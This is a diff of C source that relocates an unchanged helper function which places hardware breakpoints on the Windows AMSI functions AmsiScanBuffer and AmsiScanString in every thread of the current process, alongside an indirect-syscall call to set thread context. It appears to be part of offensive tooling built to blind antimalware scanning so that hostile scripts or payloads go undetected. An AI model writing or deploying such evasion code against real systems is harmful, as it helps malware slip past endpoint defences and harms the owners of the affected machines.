@@ -28,34 +28,6 @@
 /* Forward Declaration */
 BOOL RegisterAMSIDllWatch(void);
 
-/* Helper to apply our HWBPs to all existing threads */
-static BOOL ApplyBreakpointsToAllThreads() {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
-
-    THREADENTRY32 te32;
-    te32.dwSize = sizeof(THREADENTRY32);
-    DWORD currentPID = GetCurrentProcessId();
-
-    if (Thread32First(hSnapshot, &te32)) {
-        do {
-            /* Only target threads inside our host process */
-            if (te32.th32OwnerProcessID == currentPID) {
-                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
-                if (hThread) {
-                    SuspendThread(hThread); // Must suspend to change Context reliably
-                    if (s_pAmsiScanBuffer) SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
-                    if (s_pAmsiScanString) SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
-                    ResumeThread(hThread);
-                    CloseHandle(hThread);
-                }
-            }
-        } while (Thread32Next(hSnapshot, &te32));
-    }
-    CloseHandle(hSnapshot);
-    return TRUE;
-}
-
 /*---------------------------------------------------------------------------
  *  AMSI result codes
  *-------------------------------------------------------------------------*/
@@ -239,6 +211,34 @@ static BOOL ClearHardwareBreakpoint(HANDLE hThread, int drIndex) {
 
     status = IndirectNtSetContextThread(hThread, &ctx);
     return NT_SUCCESS(status);
+}
+
+/* Helper to apply our HWBPs to all existing threads */
+static BOOL ApplyBreakpointsToAllThreads() {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(THREADENTRY32);
+    DWORD currentPID = GetCurrentProcessId();
+
+    if (Thread32First(hSnapshot, &te32)) {
+        do {
+            /* Only target threads inside our host process */
+            if (te32.th32OwnerProcessID == currentPID) {
+                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+                if (hThread) {
+                    SuspendThread(hThread); // Must suspend to change Context reliably
+                    if (s_pAmsiScanBuffer) SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
+                    if (s_pAmsiScanString) SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
+                    ResumeThread(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te32));
+    }
+    CloseHandle(hSnapshot);
+    return TRUE;
 }
 
 /*---------------------------------------------------------------------------
